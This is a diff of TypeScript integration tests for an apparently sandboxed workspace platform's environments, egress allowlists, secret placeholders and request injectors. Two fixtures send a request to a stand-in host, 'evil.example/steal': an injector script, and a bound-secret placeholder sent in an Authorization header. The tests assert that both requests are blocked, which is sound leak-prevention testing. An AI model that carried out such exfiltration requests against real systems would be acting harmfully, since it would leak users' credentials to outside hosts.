@@ -466,6 +466,7 @@ describe("projects and GitHub (02, Projects and GitHub)", () => {
       defaultBranch: "main",
       settings: {},
       sortOrder: 1,
+      environmentId: null,
     });
     expect(list.map((p: Row) => p["id"])).not.toContain(other.projectId);
   });
@@ -2469,5 +2470,309 @@ describe("MCP servers (02, MCP servers; 01, User MCP servers)", () => {
       headers: { Authorization: placeholder },
     });
     expect(leak.status).toBe(403);
+  });
+});
+
+// ======================================================================
+// 01, Environments; 02, Environments server functions
+// ======================================================================
+
+const INJECTOR_CODE = `export default {
+  async fetch(request, env) {
+    const mac = await env.SECRETS.hmac("SIGN_KEY", "hello", { hash: "SHA-256" });
+    const hex = [...new Uint8Array(mac)].map((b) => b.toString(16).padStart(2, "0")).join("");
+    const headers = new Headers(request.headers);
+    headers.set("x-signature", hex);
+    headers.set("x-api-key", "tempo-secret-SIGN_KEY");
+    if (new URL(request.url).pathname === "/escape") return fetch("https://evil.example/steal");
+    if (new URL(request.url).pathname === "/throw") throw new Error("boom with data");
+    return fetch(new Request(request, { headers }));
+  },
+};
+`;
+
+const hmacHex = async (key: string, data: string): Promise<string> => {
+  const k = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(key),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"],
+  );
+  const mac = new Uint8Array(await crypto.subtle.sign("HMAC", k, new TextEncoder().encode(data)));
+  return [...mac].map((b) => b.toString(16).padStart(2, "0")).join("");
+};
+
+/** An owner whose project uses a new environment with the given secrets and injectors. */
+const ownerWithEnvironment = async (
+  update: Record<string, unknown>,
+  values: Record<string, string> = {},
+): Promise<Owner & { environmentId: string }> => {
+  const o = await owner();
+  const created = ok(await call("createEnvironment", o, { name: `env-${newId()}` }));
+  ok(await call("updateEnvironment", o, { environmentId: created.id, ...update }));
+  for (const [name, value] of Object.entries(values))
+    ok(await call("setEnvironmentSecret", o, { environmentId: created.id, name, value }));
+  ok(await call("setProjectEnvironment", o, { projectId: o.projectId, environmentId: created.id }));
+  return { ...o, environmentId: created.id };
+};
+
+describe("environments (01, Environments; 02, Environments)", () => {
+  it("creates, lists, updates and deletes an environment; values are never returned", async () => {
+    const o = await owner();
+    const created = ok(await call("createEnvironment", o, { name: "Payments" }));
+    expect(created).toMatchObject({
+      name: "Payments",
+      egressPolicy: "allowlist",
+      egressAllowlist: [],
+      secrets: [],
+      injectors: [],
+    });
+    expect(codeOf(await call("createEnvironment", o, { name: "Payments" }))).toBe("ENVIRONMENT_EXISTS");
+    const updated = ok(
+      await call("updateEnvironment", o, {
+        environmentId: created.id,
+        egressAllowlist: ["pypi.org", "*.stripe.com"],
+        secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }],
+        injectors: [{ name: "sign", hosts: ["signed.example"], code: INJECTOR_CODE }],
+      }),
+    );
+    expect(updated.injectors[0].sha256).toBe(await sha256(INJECTOR_CODE));
+    expect(updated.secrets).toEqual([{ name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: false }]);
+    ok(
+      await call("setEnvironmentSecret", o, {
+        environmentId: created.id,
+        name: "STRIPE_KEY",
+        value: "sk_live_1",
+      }),
+    );
+    ok(
+      await call("setEnvironmentSecret", o, {
+        environmentId: created.id,
+        name: "LOCAL_URL",
+        value: "pg://x",
+      }),
+    );
+    const [listed] = ok(await call("listEnvironments", o));
+    expect(listed.secrets).toEqual([
+      { name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: true },
+      { name: "LOCAL_URL", hosts: [], set: true },
+    ]);
+    expect(JSON.stringify(listed)).not.toContain("sk_live_1");
+    // A secret left out of `secrets` loses its stored value.
+    ok(
+      await call("updateEnvironment", o, {
+        environmentId: created.id,
+        secrets: [{ name: "LOCAL_URL", hosts: [] }],
+      }),
+    );
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    expect(await creds.listEnvironmentSecretNames(created.id)).toEqual(["LOCAL_URL"]);
+    ok(await call("setProjectEnvironment", o, { projectId: o.projectId, environmentId: created.id }));
+    ok(await call("deleteEnvironment", o, { environmentId: created.id }));
+    expect(ok(await call("listEnvironments", o))).toEqual([]);
+    expect(ok(await call("listProjects", o))[0].environmentId).toBeNull();
+    expect(await creds.listEnvironmentSecretNames(created.id)).toEqual([]);
+  });
+
+  it("rejects duplicate names, bad host patterns, and another owner's environment", async () => {
+    const o = await owner();
+    const created = ok(await call("createEnvironment", o, { name: "A" }));
+    ok(await call("createEnvironment", o, { name: "B" }));
+    expect(codeOf(await call("updateEnvironment", o, { environmentId: created.id, name: "B" }))).toBe(
+      "ENVIRONMENT_EXISTS",
+    );
+    expect(
+      codeOf(
+        await call("updateEnvironment", o, {
+          environmentId: created.id,
+          secrets: [
+            { name: "X", hosts: [] },
+            { name: "X", hosts: [] },
+          ],
+        }),
+      ),
+    ).toBe("VALIDATION_FAILED");
+    expect(
+      codeOf(
+        await call("updateEnvironment", o, { environmentId: created.id, egressAllowlist: ["Bad Host"] }),
+      ),
+    ).toBe("VALIDATION_FAILED");
+    const other = await owner();
+    expect(
+      codeOf(
+        await call("setProjectEnvironment", other, { projectId: other.projectId, environmentId: created.id }),
+      ),
+    ).toBe("NOT_FOUND");
+    const { workspaceId } = await seedWorkspace(other);
+    expect(
+      codeOf(await call("setWorkspaceEnvironment", other, { workspaceId, environmentId: created.id })),
+    ).toBe("NOT_FOUND");
+  });
+
+  it("the workspace override wins over the project's environment in getEgressConfig", async () => {
+    const o = await ownerWithEnvironment({ egressPolicy: "open" });
+    const second = ok(await call("createEnvironment", o, { name: "Strict" }));
+    ok(await call("updateEnvironment", o, { environmentId: second.id, egressAllowlist: ["pypi.org"] }));
+    const { workspaceId, stub } = await seedWorkspace(o);
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId, policy: "open" });
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: second.id }));
+    expect(await stub.getEgressConfig()).toMatchObject({
+      environmentId: second.id,
+      policy: "allowlist",
+      allowlist: ["pypi.org"],
+    });
+    expect(ok(await call("getWorkspace", o, { workspaceId })).environmentId).toBe(second.id);
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: null }));
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId });
+    // A deleted override falls back to the project's environment (01, Which environment applies).
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: second.id }));
+    ok(await call("deleteEnvironment", o, { environmentId: second.id }));
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId });
+  });
+
+  it("puts placeholders for bound secrets and values for unbound ones in env.set, and sends environment.set", async () => {
+    const o = await ownerWithEnvironment(
+      { secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }] },
+      { STRIPE_KEY: "sk_live_2", LOCAL_URL: "pg://local" },
+    );
+    const { stub, tempod } = await seedWorkspace(o);
+    await driveReady(stub);
+    await waitFor(() => tempod.requestsOf("environment.set").length > 0, 5000, "environment.set");
+    const envSet = tempod.requestsOf("env.set").at(-1).env;
+    expect(envSet).toMatchObject({ STRIPE_KEY: "tempo-secret-STRIPE_KEY", LOCAL_URL: "pg://local" });
+    expect(JSON.stringify(tempod.requestsOf("env.set"))).not.toContain("sk_live_2");
+    const summary = tempod.requestsOf("environment.set").at(-1).summary;
+    expect(summary).toMatchObject({
+      egressPolicy: "allowlist",
+      secrets: [
+        { name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: true },
+        { name: "LOCAL_URL", hosts: [], set: true },
+      ],
+      blockedHosts: [],
+    });
+    expect(JSON.stringify(summary)).not.toContain("sk_live_2");
+  });
+
+  it("stores agent proposals as pending and resolves them", async () => {
+    const o = await owner();
+    const { workspaceId, stub, tempod } = await seedWorkspace(o);
+    await driveReady(stub);
+    const proposal = { note: "Tests need PyPI.", allowlistAdd: ["pypi.org"] };
+    await runInDurableObject(stub, () => tempod.emit({ kind: "environment.proposed", proposal }));
+    let pending: Row[] = [];
+    await waitFor(
+      async () => {
+        pending = ok(await call("getWorkspace", o, { workspaceId })).environmentProposals;
+        return pending.length > 0;
+      },
+      5000,
+      "pending proposal",
+    );
+    expect(pending[0]!.proposal).toEqual(proposal);
+    ok(
+      await call("resolveEnvironmentProposal", o, {
+        workspaceId,
+        proposalId: pending[0]!.id,
+        status: "applied",
+      }),
+    );
+    expect(ok(await call("getWorkspace", o, { workspaceId })).environmentProposals).toEqual([]);
+    expect(
+      codeOf(
+        await call("resolveEnvironmentProposal", o, {
+          workspaceId,
+          proposalId: pending[0]!.id,
+          status: "dismissed",
+        }),
+      ),
+    ).toBe("NOT_FOUND");
+  });
+});
+
+const sha256 = async (text: string): Promise<string> =>
+  [...new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text)))]
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+
+describe("TempoOutbound rules 13 and 14 (01, Environments)", () => {
+  it("rule 14 swaps a bound secret in a header, the query and Basic auth, and logs rule 14", async () => {
+    const o = await ownerWithEnvironment(
+      { secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }] },
+      { STRIPE_KEY: "sk_live_3" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch(
+      "https://api.stripe.com/v1/charges?key=tempo-secret-STRIPE_KEY",
+      { headers: { Authorization: "Bearer tempo-secret-STRIPE_KEY" } },
+    );
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "api.stripe.com");
+    expect(sent?.headers.get("Authorization")).toBe("Bearer sk_live_3");
+    expect(sent?.url.searchParams.get("key")).toBe("sk_live_3");
+    const basic = await outbound(workspaceId, o.userId).fetch("https://api.stripe.com/v1/x", {
+      headers: { Authorization: `Basic ${btoa("tempo-secret-STRIPE_KEY:")}` },
+    });
+    expect(basic.status).toBe(200);
+    const sentBasic = gh.upstream.at(-1)!;
+    expect(atob(sentBasic.headers.get("Authorization")!.replace("Basic ", ""))).toBe("sk_live_3:");
+    await waitFor(async () => (await egressRows(stub)).length >= 2, 5000, "egress rows");
+    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([14, 14]);
+  });
+
+  it("refuses a placeholder for another host, an unset value, or an unknown name (rule 7)", async () => {
+    const o = await ownerWithEnvironment(
+      {
+        egressPolicy: "open",
+        secrets: [
+          { name: "STRIPE_KEY", hosts: ["api.stripe.com"] },
+          { name: "UNSET", hosts: ["api.stripe.com"] },
+        ],
+      },
+      { STRIPE_KEY: "sk_live_4" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const attempts = [
+      ["https://evil.example/", "Bearer tempo-secret-STRIPE_KEY"],
+      ["https://api.stripe.com/", "Bearer tempo-secret-UNSET"],
+      ["https://api.stripe.com/", "Bearer tempo-secret-NOPE"],
+    ] as const;
+    for (const [url, auth] of attempts) {
+      const res = await outbound(workspaceId, o.userId).fetch(url, { headers: { Authorization: auth } });
+      expect(res.status).toBe(403);
+    }
+    expect(gh.upstream.length).toBe(before);
+    await waitFor(async () => (await egressRows(stub)).length >= 3, 5000, "egress rows");
+    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([7, 7, 7]);
+  });
+
+  it("rule 13 runs the injector: it gets an HMAC, its placeholders are swapped, and it cannot leave its hosts", async () => {
+    const o = await ownerWithEnvironment(
+      {
+        secrets: [{ name: "SIGN_KEY", hosts: ["signed.example"] }],
+        injectors: [{ name: "sign", hosts: ["signed.example"], code: INJECTOR_CODE }],
+      },
+      { SIGN_KEY: "k-secret" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch("https://signed.example/upload", {
+      method: "PUT",
+      body: "x",
+    });
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "signed.example");
+    expect(sent?.headers.get("x-signature")).toBe(await hmacHex("k-secret", "hello"));
+    expect(sent?.headers.get("x-api-key")).toBe("k-secret");
+    const escape = await outbound(workspaceId, o.userId).fetch("https://signed.example/escape");
+    expect(escape.status).toBe(403);
+    expect(gh.upstream.some((r) => r.url.hostname === "evil.example")).toBe(false);
+    const thrown = await outbound(workspaceId, o.userId).fetch("https://signed.example/throw");
+    expect(thrown.status).toBe(502);
+    expect(await thrown.text()).toBe("tempo: injector sign failed");
+    await waitFor(async () => (await egressRows(stub)).length >= 5, 5000, "egress rows");
+    expect(new Set((await egressRows(stub)).map((r) => r["rule"]))).toEqual(new Set([13, 14]));
   });
 });
